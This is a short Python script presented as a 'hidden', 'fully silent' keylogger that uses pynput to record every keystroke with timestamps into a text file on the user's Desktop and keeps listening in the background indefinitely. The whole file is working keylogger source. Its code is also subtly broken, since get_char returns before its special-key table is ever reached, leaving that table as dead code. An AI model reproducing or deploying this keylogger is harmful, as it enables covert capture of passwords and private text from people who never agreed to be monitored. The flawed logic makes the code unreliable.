# Hidden Personal Key Logger - Fully silent, live auto-update in Notepad
import os
from datetime import datetime
from pynput import keyboard

# File on Desktop: textlog.txt
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
filename = os.path.join(desktop, "textlog.txt")

# Create file with header if it doesn't exist
if not os.path.exists(filename):
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"--- Key Logging Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

def get_char(key):
    try:
        return key.char if hasattr(key, 'char') and key.char else ""
    except:
        return ""
    special_map = {
        keyboard.Key.space: " [SPACE] ",
        keyboard.Key.enter: " [ENTER]\n",
        keyboard.Key.tab: " [TAB] ",
        keyboard.Key.backspace: " [BACKSPACE] ",
        keyboard.Key.delete: " [DELETE] ",
        keyboard.Key.shift: "", keyboard.Key.shift_r: "",
        keyboard.Key.ctrl_l: " [CTRL] ", keyboard.Key.ctrl_r: " [CTRL] ",
        keyboard.Key.alt_l: " [ALT] ", keyboard.Key.alt_r: " [ALT] ",
        keyboard.Key.esc: " [ESC] ",
        keyboard.Key.caps_lock: " [CAPS_LOCK] ",
        keyboard.Key.up: " [UP] ", keyboard.Key.down: " [DOWN] ",
        keyboard.Key.left: " [LEFT] ", keyboard.Key.right: " [RIGHT] ",
    }
    return special_map.get(key, f" [{str(key).upper()}] ")

def on_press(key):
    char = get_char(key)
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_line = f"[{timestamp}] {char}"

    # Append to file immediately (Notepad will auto-detect changes)
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(log_line)
            f.flush()  # Force write to disk instantly
        # Optional: Add small delay if too fast (rarely needed)
        # import time; time.sleep(0.01)
    except:
        pass

# Add new session header
with open(filename, 'a', encoding='utf-8') as f:
    f.write(f"\n--- New Session: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
    f.flush()

# Start listening silently in background
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the script running forever (hidden)
listener.join()
